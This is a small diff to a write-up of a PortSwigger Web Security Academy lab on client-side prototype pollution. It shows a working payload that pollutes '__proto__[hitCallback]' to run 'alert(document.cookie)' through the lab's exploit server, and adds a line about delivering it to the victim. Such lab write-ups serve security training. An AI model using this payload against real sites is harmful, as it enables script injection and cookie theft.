@@ -41,6 +41,7 @@ Finally we can procedd to set the following payload in the exploit server body s
 location="https://0a7500430345299fc0897277007c00cb.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
 </script>
 ```
+Deliver the exploit to the victimo to solve the lab
 
 #### References
 + https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance
